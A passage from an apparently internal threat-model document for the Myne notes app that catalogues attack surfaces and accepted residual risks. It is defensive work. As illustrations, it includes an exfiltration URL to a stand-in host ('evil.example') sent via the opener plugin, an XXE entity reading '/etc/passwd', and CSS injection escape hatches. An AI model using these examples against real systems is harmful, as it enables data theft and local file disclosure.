The bound is now a host-side `on_navigation` allowlist admitting only the app's own origins (`src-tauri/src/navigation.rs`, a command-less plugin covering both the main and the pdf-export webview), plus `form-action 'none'` for the form-submission form of the same channel and `base-uri 'none'` against a `<base>` injected to repoint relative asset URLs. **The mobile client carries the same bound as of myne#453** (`mobile/src-tauri/src/navigation.rs`, plus the same three directives in its own `tauri.conf.json`: `form-action 'none'`, `base-uri 'none'` and `frame-ancestors 'none'`): it renders this surface in the same kind of WebView from the same shared editor, so for as long as the desktop half shipped alone the clause above was true of one client and not of the other. Three limits stated rather than implied: on Windows the hook sees only top-level navigations (wry does not wire `add_FrameNavigationStarting`), so a sub-frame there is bounded by `frame-src` alone; on **Android** `WebViewClient.shouldOverrideUrlLoading` (the hook wry installs there) is not called for POST requests, so a form submission is invisible to the allowlist and is bounded by `form-action 'none'` instead; and in a dev build the frontend is served by Vite rather than the `tauri://` protocol handler, so no CSP is attached at all and the navigation allowlist is the only one of these controls that runs. The mobile allowlist is unit-tested and CI-run, but no CI lane executes an iOS or Android build, so its device behaviour is **not verified**. A manual checklist exists (`mobile/docs/dev/device-matrix.md` §11) and nothing schedules it: no CI step names it, no release runbook references it, and it had not been run on either platform when this shipped. State it as the gap it is rather than as a compensating control, because a control nobody owns and nothing records is a claim. What IS verified is the unit-tested matching logic and the config strings; what is not is that the host hook fires on a device at all. **And this bullet is the WebView's own load-and-navigate surface, not an exhaustive account of outbound reach**: the ACL grants `opener:default` on both clients, so a script that already has the DOMPurify bypass this residual assumes can hand `https://evil.example/?d=<noteBody>` to the OS browser through `plugin:opener|open_url`, with no navigation and no fetch for any of the controls above to see. That grant is what makes an ordinary autolink open where the user expects, it predates this bullet on both clients, and it is named here because the enumeration otherwise reads as closed, which is the same overstatement this clause already had to correct once. **Multi-color highlight (`decisions.md` 2026-06-15) widens `ALLOWED_ATTR` to `[title, class]` — assessed as NOT a meaningful surface increase.** `class` is constrained by an `uponSanitizeAttribute` hook to exactly one token from a closed 5-value enum (`hl-yellow|hl-green|hl-blue|hl-pink|hl-purple`) on a single tag (`<mark>`); no arbitrary class, no multi-class, no `style`, no selector injection, no remote fetch. The only new capability an attacker-authored note gains is painting one of five fixed background washes — purely cosmetic. The residual risk remains the same DOMPurify-bypass class, unchanged in magnitude by an enum-constrained attribute.
- **Importer untrusted-markup parse surface (MYND-580).** The importer-breadth epic adds a **second** untrusted-markup parse surface alongside the embedded-HTML render surface above: three of the four new [import adapters](glossary.md#import-adapter) (Evernote ENML, generic HTML, Notion HTML) convert attacker-influenceable markup to markdown in the WebView (TB2). Three controls bound it. **(i) XXE-safety is structural, not procedural.** Every Evernote export legitimately carries an external-DTD doctype (`<!DOCTYPE en-export SYSTEM "http://xml.evernote.com/pub/evernote-export3.dtd">`); a parser that resolved external entities would both **fetch a remote URL** — violating the standing no-remote-fetch anti-feature from a path whose premise is that the importer never reaches the network — and accept `<!ENTITY x SYSTEM "file:///etc/passwd">`, reading local files into note content. Parsing goes through `DOMParser`, which loads no external DTD, resolves no external entity, executes no script, and fetches no subresource for a document with no browsing context, so the doctype is inert **by construction**. **(ii) The parsed document is never attached to the live DOM** — it is walked into markdown and discarded; the invariant is asserted by test, not just documented. **(iii) The import allowlist is expressed as the render allowlist plus an explicitly enumerated delta**, so the widening is what a reviewer audits and the two configs cannot silently desynchronize. The delta is wider than render — structural elements plus `href`/`src` — which is sound here for a different reason than render's: the **output is markdown text, not DOM**. A remote `![](https://…)` in that text is inert (`findImportedImageRefs` excludes URL-bearing refs so the importer never fetches them, and `markdown-dialect.md` §7 does not render a raw-path ref as an `<img>`), and URL schemes are narrowed to http/https/mailto/document-relative twice over — by `ALLOWED_URI_REGEXP` in the sanitizer and by an explicit walker check that *reports* the drop rather than swallowing it. Evernote `<en-crypt>` spans are **preserved verbatim as inert text**, never decrypted or executed — they are content the user deliberately protected under a passphrase Myne does not hold, so destroying them would be the worst available outcome. Residual risk is the same DOMPurify-bypass class already accepted for the render surface, in the same process, mitigated the same way (install base, single purpose, exact-pin) — no new adversary, asset, or trust boundary. (`decisions.md` 2026-07-25.)
- **Mermaid diagram render surface (MYND-49).** Rendering ```mermaid blocks as SVG (TB2 WebView) parses untrusted note content and injects SVG. Mermaid runs `securityLevel:'strict'` + `htmlLabels:false`, so it sanitizes its own output via its bundled DOMPurify (no click/script/`<foreignObject>` handlers, no raw-HTML labels); lazy-loaded, no remote fetch. This is the **heaviest dependency** Myne adds (≈+100 transitive packages), the largest TB9 supply-chain expansion (`dependency-policy.md`), accepted as a conscious decision (`decisions.md` 2026-06-08) with lazy-load + exact-pin + the `securityLevel:'strict'` control. On any render/parse failure the block falls back to a monospace source card carrying, when mermaid gave one, a single line naming the reason; that line is set with `textContent`, never `innerHTML`, and mermaid's error text can quote the offending note source, which the card above it already shows verbatim, so it crosses no boundary the block did not already cross (myne-md/myne#629). The sanitizer's own output is what reaches the DOM: the sizing correction that ships with the same change sets two attributes and removes one inline declaration on the SVG node AFTER it is in the document, rather than re-parsing and re-serialising the sanitized string before the sink, which would put a cross-context round-trip between DOMPurify and the injection point. That correction also removes the implicit bound mermaid's own `width="100%"` used to provide: an SVG now carries its natural pixel size, so a note-declared box is capped at `MAX_DIAGRAM_PX` (20000) instead, availability only, with the card's `max-width: 100%` and `overflow-x: auto` still bounding what is painted on the inline axis. **The sanitizer instance is part of this control.** DOMPurify's `addHook` mutates the instance it is called on for every consumer of that instance, and the embedded-HTML sanitizer registered its `<mark class="hl-*">` hook on the module's shared default one, which mermaid also calls: measured in the shipped WebView, every `class` was stripped from every diagram, so mermaid's class-keyed `<style>` matched nothing and each shape fell back to the SVG default black `fill`. `editor/src/html/sanitize.ts` now takes a private instance, which restores mermaid's `securityLevel:'strict'` sanitize to DOMPurify's own defaults and leaves the embedded-HTML rules untouched.
- **Hidden PDF-export render window (MYND-255).** The per-note PDF export renders the note's HTML projection in a second, invisible WebView window for native print-to-PDF capture — a same-kind TB2 surface (plaintext already renders in a WebView), bounded by construction: a near-empty capability (the window can invoke only its payload-fetch and ready-signal commands), content protection applied before its first frame, destruction after every capture (success or failure), and teardown at every vault-lock path alongside the main window — locking the vault tears this plaintext surface down too. (`decisions.md` 2026-06-11.)
- **Detached (pop-out) note windows are a second plaintext WebView surface, protected and torn down like the main window (epic myne#173: #677 capability ACL, #678 creation, #679 lock-teardown, #680 screen-capture).** Popping a note out spawns an OS window (label `note-<id>`) that renders the note's decrypted plaintext in its own WebView: a same-kind TB2 surface exactly like the hidden PDF-export window above, and bounded the same way by construction. **Capability:** a narrow per-window `detached-note` set (read-only prefs and a minimal command allowlist, never any `prefs:allow-set-*`, decision 0136); `root_key` never crosses to it, plaintext arrives only through the note commands, and window creation is a host command because page context holds no window-create grant. **Screen-capture:** protection is applied host-side to each pop-out before its first frame and re-applied after `show()` (#680, the #483 both-sides-of-`show` discipline for the Windows affinity that resets across a show), MIRRORING the main window's resolved state rather than holding its own, so the device-wide override (myne#482) removes protection from a pop-out exactly as it does from the main window, and a runtime toggle fans out to every open pop-out. **Teardown:** every vault-lock path (idle auto-lock, manual lock, quit, vault-switch, and the change-password force-relock) destroys every pop-out, hide-then-destroy (#679), so a locked vault leaves no note text on screen in any window and no pop-out outlives the lock the main window obeys. **Per-platform reality is the main window's, not a stronger one:** on Windows 19041+ each pop-out is excluded from capture (§6); on **macOS and Linux a pop-out is exactly as capturable as the main window already is**, with no new protection claimed and no per-window badge, so the honest downgrade story stays the single one in this section rather than a per-window guess. **SYNC-3 (attachment reader set):** the detached window is an allowed reader of the `attachment://` scheme. The reader allowlist widens from {main, pdf-export} to include `note-*` labels, and the fence matches by label prefix rather than per note, so like the main window a pop-out can read any attachment its capability already grants, not only its own note's. This grants no new exposure, because a window that already renders note plaintext can already reach that vault's attachment bytes through the same capability. TB2 widens by one same-kind surface; no new adversary, asset, key, blob, magic or AAD role is introduced. (`decisions.md` 2026-09-06.)
- **The plain-file editor opens a user's own on-disk markdown, and Myne writes NOTHING derived about it (myne-md/myne#788, `decisions/clients/0625`).** A desktop user can open their own `.md`/`.markdown` from the OS (argv on Windows/Linux, the open event on macOS, a native dialog, `myne open` from the CLI, and a `myne://open-file` deep link the user explicitly confirms) and edit it in place without the file entering a vault. Drag-and-drop remains blocked rather than shipped (`dragDropEnabled: false`, `decisions/storage/0151`), and the user-guide article is owed by the companion `myne-website` session. **The A5 sentence above is unchanged**, and this bullet is the statement of what sits beside it: the file is the user's own plaintext, it is outside A5's guarantee, and the surface must never derive from it. **What is structural rather than promised:** **no path becomes a handle without host-side validation**, and that is the guarantee to rely on rather than the earlier "a path never comes from the WebView", which the shipped deep link makes false: `myne://open-file?path=…` is parsed in JavaScript, so a WebView-supplied path does reach the host. Every route (OS ingress, native dialog, CLI, deep link) goes through the host's single validation: the device-local gate, canonicalisation, the `.md`/`.markdown` check on the CANONICAL path, and the 64 MiB size cap, then an opaque handle. The deep link can only RESOLVE a path for display (`plain_file_resolve_path` reads no content and mints no handle); nothing opens until the user confirms the canonical target the host resolved, and the confirmed open (`plain_file_open_confirmed`) re-validates from scratch. That confirmation is a frontend layer; the gate and the validation are host-side. The device-local gate is page-flippable like every other device setting (`gate_set` is granted to the same window): page context can turn it on and then name any `.md` it likes, so the gate is a user-facing switch and **not a security boundary against page compromise**. `tauri-plugin-fs` keeps zero grants; the write is a base-hash compare-and-swap, so an external edit, deletion or replacement refuses rather than clobbers; the editor host answers vault-coupled members emptily while the surface is active (`src/plain/surfaceMode.ts`), so the ambient reads (prefs on mount, the tag tree, the spell pass, attachment warming) cannot reach vault data even though the surface shares the main window; the custom vault palette (`MYT1`) never reaches the surface and its `style-src 'unsafe-inline'` value surface is not extended. **What is never written:** no recents (app-level or OS-level), no `vault.workspace` entry, no on-disk buffer, no snapshot, no `.bak`; the crash window is the autosave debounce and version history is the user's own tooling. **The gate is device-local** (`<app_config_dir>/plain-file.json`, sibling of `tor-routing.json`; **amended 2026-10-01: ON by default (an ABSENT file reads as enabled, while an unreadable or malformed one still reads as disabled)**) because `developer_mode` is a per-vault `vault.prefs` field and this surface must be gateable with the vault locked and with no vault at all; that is the one recorded deviation from the session that designed the feature, and it is a setting bit about the DEVICE rather than data about the file. The macOS bundle registers `md`/`markdown` document types (`bundle.fileAssociations`), so Finder's "Open With" and a double-click deliver the file through the `RunEvent::Opened` ingress; a gated-off device ignores it silently like every other OS ingress. TB2 is not widened (the main window's WebView is the surface, as with a split pane), and **the new primitive is recorded under TB6/A8 rather than waved past, and it is a READ AND WRITE, not a read**: with the gate on by default, page-context code (A8, the bundled-dependency compromise §6 separates from A7) can name any local `.md`/`.markdown`, open it (`plain_file_open_confirmed` mints a handle and the current on-disk base hash), and then overwrite it with attacker-chosen bytes through `plain_file_write`. The base-hash compare-and-swap does NOT stop this, because the attacker holds the current hash, and the gate is not consulted on write (deliberately, so a flush survives a gate toggle). The impact class is therefore confidentiality (reading the user's own files) PLUS integrity/availability (corrupting or destroying them). What bounds it is the `.md`/`.markdown` allowlist and the 64 MiB cap applied on open, and the fact that only the user's own files are reachable, never vault content, so the vault boundary (TB5) is untouched. The A7 "already holds decrypted vault plaintext" justification does NOT apply here, because the surface must work with the vault LOCKED and with no vault at all, states in which page context holds no vault plaintext; this is rated A8. **No new asset, key, blob, magic or AAD role is introduced**, but the page-context-compromise rating is widened from nothing (the WebView named no arbitrary local file before) to read and write of the user's markdown.
- **Custom-theme CSS-value surface (MYND-111).** A user-supplied custom theme (`custom themes` epic) is a plaintext `.json` map of CSS-variable values applied to `:root` via the CSSOM (`document.documentElement.style.setProperty`) — NOT injected as an inline `<style>` element, so it rides the WebView's existing `style-src 'unsafe-inline'` unchanged (no CSP loosening; `decisions.md` 2026-06-16). Because that value reaches the DOM and executes, the **primary** control is a host-side (Rust) value-shape **allowlist**: a value is accepted only when it matches a known-safe grammar (hex / `rgb()` / `rgba()` / `hsl()` / named color / `<number><unit>`), so the CSS escape hatches (`url()`, `expression()`, `@import`, `javascript:`, comment-/CSS-escape, trailing-`;` injection) are rejected by non-match rather than chased individually — the same ultra-tight-allowlist doctrine as the embedded-HTML surface above. The required-core tokens must be present and the theme name is path-traversal-guarded before any import. **The palette is vault content** (`decisions.md` 2026-07-16 supersedes the 2026-06-16 device-local-plaintext clause): it is sealed into the encrypted `vault.themes` blob (`MYT1`, `protocol.md` §9.21) under a `root_key`-derived KEK, so it is encrypted at rest, synced (a Class-1 singleton, `sync-protocol.md` §10.2.2), and included in a backup — a disk-at-rest adversary (A4/A7) no longer learns that a theme named X exists, and the A6 lock posture strengthens (the palette is now unreadable while the vault is locked, not merely un-applied). The **plaintext window narrows to explicit, user-initiated transfer**: a `.json` the user picks to import, one they deliberately export for portability, or a `myne://theme/install` deep link the user clicked and then confirmed (see the deep-link ingress note below) — the server never sees any of them (ZK unchanged). A custom theme remains **validated, not sandboxed** — the residual surface is an allowlist-grammar bug, not arbitrary CSS. **Second channel (myne#394):** a palette's *ornament* selections are additionally reflected onto the root element as `data-o-<role>-<primitive>` attributes, because CSS cannot branch on a custom property's value. This adds no new value surface — the attribute NAME is built from app constants and the VALUE must match an enumerated literal set before it is written, so nothing theme-controlled reaches `setAttribute` unchecked — and the rules those attributes select are Myne's own stylesheet, never the theme's. The rating is unchanged; the channel is recorded so the CSSOM sentence above is not read as exhaustive. Applies editor-only and reverts on lock (A6 parity, like the built-in Theme preference). **A third channel rides the same apply, and it is not the theme's**: since myne-md/myne#900 each apply also seeds the built-in appearance canon (the values the shipped stylesheet declares for the appearance the theme's `--paper` implies) as inline properties for the tokens a theme may omit. Those values are read from the app's OWN stylesheet, never from the theme file; they never needed `theme_validator` because the theme never authored them; and the same `clearCustomTheme` revert removes them on lock. No value surface and no adversary rating changes, and the channel is recorded here so this bullet's list stays exhaustive.
- **Tauri supply-chain surface.** Tauri's Cargo dependency tree is materially smaller than Electron's npm tree was, but transitive crate compromise (A8) remains feasible. Cargo lockfile pinning, `cargo-vet` or `cargo-audit` in CI, and a deliberately small direct-dependency surface are the response. The UI layer (React inside the Tauri WebView, bundled by Vite at build time) still pulls npm packages, but the security-critical crypto path lives in the Rust core and is isolated from the WebView via the IPC boundary. Choosing Vite + React over Next.js (`decisions.md` 2026-04-26) shrinks the direct-npm-dependency surface roughly tenfold.
- **Screen-capture protection is unavailable on macOS and on Linux, and degrades on Windows builds below 19041.** The three gaps have different causes and only one of them is ours to close, so they are listed apart. **macOS:** Apple documents `NSWindowSharingNone` as a legacy constant macOS no longer uses, with an explicit instruction not to use it to hide content from capture, and states no public API exists for preventing screen capture. The call is retained; nothing is claimed (§6). There is no timeline, because there is no API to adopt. **Linux:** no display server offers a client-requestable exclusion. On X11 this is architectural rather than a missing feature — any client can read the root window or a redirected window's pixmap, so there is nowhere to place the check, and no amount of client-side work changes that. On Wayland the capture path is mediated by the compositor, and two compositors ship an exclusion that is **user-configured, not application-requestable**: KWin's "Hide from Screencast" (Plasma 6.6, persisted as a window rule in 6.7) and Hyprland's `no_screen_share` window rule (0.50.0). GNOME/Mutter ships nothing. A client-facing Wayland protocol has been proposed upstream and has not landed; adopting it would then need `tao`/Tauri support before Myne could call it, so no commitment date is given. The honest user-facing guidance on Linux is the per-compositor rule above, not a promised release. **Windows below build 19041:** `SetWindowDisplayAffinity` silently degrades `WDA_EXCLUDEFROMCAPTURE` to `WDA_MONITOR`, which blacks the window out rather than excluding it.
- **The pre-unlock screen-capture escape is a device-local plaintext boolean, and its presence is one bit of at-rest signal (myne-md/myne#482).** The escape from the lockout described in §6 persists at `<app_config_dir>/screen-capture.json` (`{"disabled": bool}`), outside any AEAD envelope, alongside the other device-local plaintext settings under that directory (`sync-config.json`, `tor-routing.json`, `legal-consent.json`, `vault-names.json`, `backup-schedule.json`, `clipper-install.json`, `ai-endpoint.json`, `diagnostic-log.json`). To an at-rest disk observer (A5) or local malware (A7) it reveals **that this device does not apply screen-capture protection**. Four things bound that, and they are stated rather than mitigated. **First**, it is a targeting signal an A5-only adversary cannot act on, and the row that could act on it does not need it: capturing the window needs local code execution, and A7 has the native privileges §6 records as able to set the affinity to `WDA_NONE` directly, so it neither has to read this bit nor has to write it. The row this file is genuinely informative to is A8, which executes in page context only: it can read the bit and set it through the unguarded setter §6 names, which is where that capability is rated rather than here. **Second**, it is device-local and never synced, so it says nothing about the account or about any other device. **Third**, the "Local prefs replay" bullet below does **not** bound it: that bullet rests on AEAD verification and the `account_number_hash` AAD binding, and this file carries no MAC and no vault binding, so an adversary with disk write can set it either way. Detection parity is weaker here than in that bullet, and the difference is worth stating: both surfaces read the same value, but they read it from process state rather than from disk (which is deliberate, since process state is what the window is obeying), so a disk-write flip is invisible for the rest of the running session and surfaces at the next launch rather than the next view. The file fails towards protection when it cannot be read. **Fourth**, what the presence of the file discloses beyond that bit is that this user engaged the escape at all, and it survives them restoring protection: the write path always writes and never unlinks, so turning protection back on leaves `{"disabled": false}` on disk rather than nothing. For the population this exists for, that is an inference about assistive-technology or remote-access use. The `--disable-screen-capture-protection` process flag writes nothing on its own and is reported apart from the file, so a run that only ever used the flag discloses nothing at rest, and no write to disk can talk that run out of the override. It is read at startup and again on a relaunch, because the documented recovery is a user reaching for a terminal while the black window is already up, and the relaunch is the only path on which it reaches an already-unlocked session. That path shares its argv with the `myne://` ingress below, whose nuisance-class rating this change does not move: an argv carrying a deep link refuses the flag outright, so no browser quoting behaviour has to be assumed for the rating to hold. A sealed store was considered and rejected as the mechanism: at the time, every keychain-backed store in this codebase was Apple-only (`core/src/vault_label/key.rs`), so it would have shipped on macOS alone and been absent on BOTH Linux and Windows, the second of which is the only platform where the layer works. (Corrected 2026-10-30: that premise held when this bullet was written and no longer does, since myne-md/myne#938 added a Secret Service rung, a DPAPI rung and a PIN-sealed file rung for the DEVICE SIGNING KEY only. The decision it supports is unchanged: the sealed-label store still ships Apple-only, and this bullet's reasoning is why.) **The file has exactly two writers, and the sealed preference is not one of them** (`decisions/security/0705`): the pre-unlock escape, and the single post-unlock Settings row, which writes the file *and* the preference together under an authenticated user's deliberate action. A replayed or tampered `vault.prefs` therefore does **not** reach pre-unlock protection — startup and every lock resolve the requested value to `true` regardless of the sealed field — so the "Local prefs replay" bullet above does not extend to the lock screen, and the §6 exception is an explicit write rather than an inference from vault state. **No adversary rating changes.** (`decisions.md` 0562; same class and same treatment as the `vault-names.json` limits above.)

- **The mobile clients' screen-capture protection has residuals of its own, and §6 states the mechanism (2026-10-16).** §6 carries what each platform applies and how confident that claim is: Android a documented flag, iOS an undocumented technique applied in code and unverified on hardware. What belongs here is what neither platform does. A phone's protection ends at the device, so a capture taken by pointing another camera at the screen is untouched, exactly as on macOS and Linux. **The app-switcher snapshot is a second open path, and it is asymmetric:** Android's `FLAG_SECURE` covers the recents thumbnail, while the iOS arm is best-effort and does not contractually blank it (`mobile/docs/dev/device-matrix.md` row 7.7, `mobile/src-tauri/src/screen_guard.rs`), so a phone photographed in the app switcher is a first-order capture route for the unlocked-and-open adversary this document rates. There is no device-local override on this client, so the post-unlock Settings toggle is the only control and it cannot be reached before unlock: that is where the desktop and mobile PRE-UNLOCK CONTROL postures differ, and it is a statement about controls rather than about coverage, since the desktop's own coverage varies by platform above. And both mobile arms' honest state is "applied and awaiting the §7 device walk", not "verified".

  **One file in that directory now holds a secret rather than a setting (myne-md/myne#800).** `sync-config.json` carries the operator-configured invite code for a gated sync server (`decisions/sync/0627`), stored beside the endpoint as device-local plaintext. It is a **shared admission word**, so an at-rest disk observer (A5) or local malware (A7) that reads it can register new accounts on that server until the operator rotates the code. Four things bound it and are stated rather than mitigated. It is device-local and never synced, so it grants nothing on any other server and admits no one to any vault (it is not a key and decrypts nothing). The server keeps no code-to-account record, so possession of the code confers admission, not identity. It is sent only on the registration request of a new account and never after, so a device that only ever joins an existing account need not hold it. And the client drops it whenever the endpoint address changes, so it is not carried to a different server. It is recorded here because a reader who treats that directory as settings-only would miss the one value that grants something beyond this device. **No adversary rating changes.**
- **Local prefs replay.** An attacker with disk-write access can restore prior valid `vault.prefs` snapshots (see `spec/protocol.md` §9.5), reverting Myne-managed user preferences to earlier states. The attack is bounded to prior user choices — no arbitrary state injection is possible because AEAD verification (and the `account_number_hash` AAD binding) still applies. The current preference is visible in the Privacy panel UI on the next view, providing user-side detection. No structural defense in v0.1; a monotonic counter or per-blob freshness token was rejected during the MYND-160 grill because the `vault.meta` forensic-frozen discipline (`spec/protocol.md` §10.6) forecloses extending `vault.meta` to carry the counter, and storing the counter outside `vault.meta` adds a second artifact for marginal gain. **Two-class prefs taxonomy (MYND-121).** Preferences in `vault.prefs` split into two classes with respect to this limitation: (1) **best-effort prefs** (e.g. the screen-capture toggle) which inherit the replay limitation above — a replay merely reverts a user choice; and (2) **code-enforced security envelopes** which do **not** inherit it. The auto-lock timeout is class (2): its enabled flag is a code constant and its effective value is `clamp(pref, …, AUTO_LOCK_CEILING)` resolved in code, so a replayed, deleted, or tampered `vault.prefs` can only make auto-lock *stricter*, never disable it or exceed the ceiling. The A6 guarantee that auto-lock provides therefore does not degrade under local prefs replay.
- **A disk-write adversary can delete a note or roll one back, silently (at-rest; no key material needed).** Nothing in v0.1 binds a note's *revision* or the note *set*. A `.myn` blob's AEAD proves it is that note in that vault (`spec/protocol.md` §6.5), not that it is the current revision, and no artefact commits to the collection of files. Two consequences follow for an attacker with write access to the vault directory — the same A4/A7 capability the `vault.prefs` replay item below already concedes, and no more: **deletion is invisible**, because note enumeration is a directory read with no roster to check against and the derived caches are specified to follow disk (§9.6.4 and §9.8.4 each say a note absent from disk is dropped); and **rollback is turnkey**, because `snapshots/` (§9.1) already holds byte-verbatim earlier copies of the same note, sealed under the same `item_key` with the same identity bytes, so copying one over the live file yields a blob that passes every check the format performs. No plaintext or key material is exposed either way — this is integrity and availability, not confidentiality. Bounded on three axes: the attacker must already be able to write the vault directory (an attacker who can do that can also simply delete it, which is louder but not harder); nothing can be *forged*, only removed or reverted to something the user themselves wrote; and Phase 2's vault head (§9.16) closes the server-side version of the same attack for the families it covers, though it is not an at-rest defence. Accepted for v0.1 under the same posture as the prefs-replay item: closing it means either a freshness field in the per-note AAD — which would break §6.3's rewrite-cheapness and invalidate the published vector corpus — or a signed local roster, a second artefact with its own rollback problem. The nearest existing neighbour is the backup item directly below, which is the whole-vault form of the same thing.
- **Vault backups outlive in-vault security events (whole-vault replay).** The user-initiated backup feature (MYND-58/32/218/56; `spec/protocol.md` §9.11) writes a single `.myne-backup` file containing byte-for-byte ciphertext copies of the vault's files. Because the copies are verbatim, three consequences follow, all strictly larger than the `vault.prefs` replay limitation above. (1) **Restore resurrects permanently-deleted notes.** Cryptographic erase (deleting a note's wrapped `item_key`) holds against disk adversaries (A5) — but a backup taken *before* the delete still carries the note's `.myn` blob with its wrapped key inside, and restoring that backup brings the note back. Erase guarantees apply to the live vault, **not** to user-held backup copies. (2) **Old credential wraps persist.** A backup's embedded `vault.meta` carries the credential wraps as of export time: after a password change, every earlier backup still unlocks with the *old* password, and the never-rotating recovery phrase opens *every* backup of that vault, forever. Users who suspect password compromise must treat pre-change backups as openable by the old password. (3) **The backup file itself is a new at-rest artifact at a user-chosen, possibly removable location** (USB stick, cloud-synced folder) — outside the app-data directory and outside Myne's sight. What it leaks to an observer (A5/A7) is the same class as the live vault directory: member count, per-member sizes, and UUIDv7 creation-time buckets — never titles, tags, folders, content, or user-meaningful timestamps (all inside AEAD). The member table's per-member SHA-256 checksums are **unkeyed**: they exist to detect accidental corruption/truncation honestly at export and restore time and claim **no tamper resistance** — an attacker who modifies a member can recompute them; tamper defense remains per-blob AEAD verification at first unlock, exactly as for the live vault. Accepted for v0.1; UI and website copy must present backups within these bounds (no "tamper-proof", no "safe forever", no leak-free claims). (`decisions.md` 2026-06-10; epic MYND-217.)
- **Server backups bound how long a deleted blob survives (operational durability vs cryptographic erase).** Encrypted off-box backup is a **built-in `myne-server` feature** (`decisions.md` 2026-07-14; MYND-505): when enabled by env, the server drives a bundled restic to snapshot its own store to an off-box target on a short cycle (default 14-day retention) so a disk failure cannot lose users' ciphertext (the local-first product still holds the plaintext on devices, but a server-side loss would force every device to re-push). Hosted and self-host use the **same mechanism** (TB5 parity); enabling it is an operator choice, **off by default**. A backup taken *before* a note/attachment deletion carries that ciphertext until the backup itself ages out, so the *effective* worst-case window a deleted blob survives on the operator's side is `retention-horizon + backup-retention` (≤ horizon + 14 days), not the horizon alone. This is bounded (short-cycle, pruned), encrypted (restic repository key held by the operator; the server still cannot read the blobs — this changes retention duration, not confidentiality), and disclosed (here + `self-host-policy.md` §3). It is strictly smaller than the user-held `.myne-backup` case below (which has no bound and no operator control). **Two operational facts the built-in feature introduces:** (a) an enabled server makes **outbound network connections** to the backup target — a new egress from an otherwise inbound-only blind store, carrying only restic-encrypted data; and (b) the **restic repository key + destination credentials** are a new **operator-held secret** — defense-in-depth over already-client-encrypted blobs, so a compromise widens the retention/durability exposure of ciphertext, never plaintext confidentiality, and the zero-knowledge root is untouched. A self-host operator who backs up inherits the same window and the same disclosure obligation. Accepted; marketing/limits copy must not claim "deleted is instantly gone server-side" — it is gone within the disclosed window. (`decisions.md` 2026-07-13 + 2026-07-14; MYND-496/505.)
- **Operator console is an admin surface, and the panel on it widens the ACCESS CRITERION rather than the STORED history (MYND-506; web panel myne-md/myne#787).** The operator drives account enforcement — view, freeze, per-account quota/device overrides, and irreversible delete — through an admin API bound to a **local Unix domain socket** (`MYNE_ADMIN_SOCKET`; no bearer secret — access is filesystem permissions, i.e. whoever can `docker exec` / is root on the box) plus a `myne-server admin` CLI. **It adds no boundary expansion**: the operator already has full filesystem access to the store (TB5/TB6), so the socket is a convenience interface over enforcement state the operator could already edit by hand. The enforcement state lives in a sparse server-side plaintext `accounts.json` of the same class as the already-visible device count / stored-byte size (AS16/AS17) — never user content, never a new secret. The console is a **projection of already-persisted enforcement state only** — no request history, no last-seen wall-clocks, no per-account time series (the MYND-440 aggregate-only invariant).

  **The operator panel (`MYNE_ADMIN_PANEL_ADDR`, myne-md/myne#787) widens the ACCESS CRITERION, and that is a boundary change, not a formality.** A browser cannot dial a Unix domain socket, so the panel is a **network-bindable TCP listener**: it is NOT local-only, and it is still never the public edge. Who can read it moves from "whoever can execute commands as the operator" to "whoever can reach the bind address", and the bounds on that are: it is **read-only** (no write route is reachable on its listener); it is **off by default**; it carries **no request log at all**, because self-host-policy §3 prohibits IP logging anywhere in an operator's stack; and it **validates `Host` against a known set**, which is its entire authentication story.

  **What is unchanged is what the panel STORES: it adds no new persistence.** It projects the same already-persisted enforcement state and holds nothing between requests, and it renders no time value. The last part is a rule about the projection, not a fact about the store: per **AS6** the server DOES hold note `created_at` at millisecond resolution, derived from the UUIDv7 in the per-vault index, so a derived time value (a file mtime, a record age) MUST NOT be added to the projection.

  **This is NOT "no new observation channel", and the difference is load-bearing.** The panel is **per-account by construction**: it keeps the no-time-series half of the aggregate-only invariant and does not keep the no-per-account-label half that `/metrics` does. A party that can reach the bind address can poll it and **derive** a per-account series of stored bytes and device count by diffing responses, with nothing stored server-side. It also drops the anti-enumeration property `server-protocol.md` §3.1 maintains on the auth surface, where an unknown account and a wrong username answer alike: this surface publishes the complete roster to an unauthenticated reader.

  **The roster is a list of credentials, and the account-number reasoning is where this row is easiest to get wrong.** The panel exposes **no account number**, because none exists on the server: the raw number never crosses the sync wire, the server stores `account_number_hash := SHA-256(canonical_form)[:16]` (`account-number.md` §6, §7), and a raw-form username is refused at registration (`server-protocol.md` §3.1, AS9). **That does not make the roster harmless, and "non-reversible" is not the property that decides it.** Per `server-protocol.md` §3.1 the pre-auth `GET /vault.meta` route is keyed on that same hash and returns **the complete offline password-cracking target**: Argon2id salt, cost parameters, and both wrapped `root_key` copies. Anyone who can reach both the panel and the public sync API can therefore mount an offline cracking campaign against every account on the deployment. On this surface the hash is the account number for every purpose the pre-auth route cares about.

  **The listener terminates no TLS (TB4).** On a non-loopback bind the roster crosses TB4 in cleartext to a passive observer, which is a different exposure from `/metrics` and is why the loopback bind is the documented default rather than a convenience. A non-loopback bind is **warned about, not refused**, on both the panel and the metrics listener, and the reasoning is measured: a non-loopback *metrics* bind is frequently the correct configuration, since Prometheus scraping from another host is the ordinary deployment. The **public exposure of the panel on any origin Myne operates** is outside this feature and tracked in `operations`; this feature ships the panel private only.

  **The properties this paragraph rests on are pinned by tests, not asserted here.** A claim in this document that no test holds is a claim that can rot silently, and every one of these was verified by injecting the defect and watching the named test fail, not by reading it green. In `myne-server`: read-only is a route-table assertion that any write verb reaching a handler fails, plus a source assertion that the package cannot name one (`internal/panel/panel_test.go`); the `Host` allowlist is pinned by a rebound-`Host` case and a LAN-opt-in case in the same file; `no-store` and single-enumeration are asserted there too; the discarded-error-log and panic-recovery pair is asserted in `internal/httpapi/panel_wiring_test.go`; and the aggregate-only claim on `/metrics` is held by a structural label denylist in `internal/httpapi/metrics_test.go`. A `myne-server` tree that is absent or lacks the panel package makes each of those assertions fail by name rather than vanish.

  This is a third local ingress of the **A16** shape (a listener reachable by peers with no
  key authentication), and a weaker one than the 0600 unix sockets that row already names:
  TCP, unauthenticated, and with no file mode to check. A16's conclusion (that Myne does
  nothing about it and says so) applies unchanged. The panel bounds it with `Host`
  validation and an off-by-default bind; it does not authenticate.

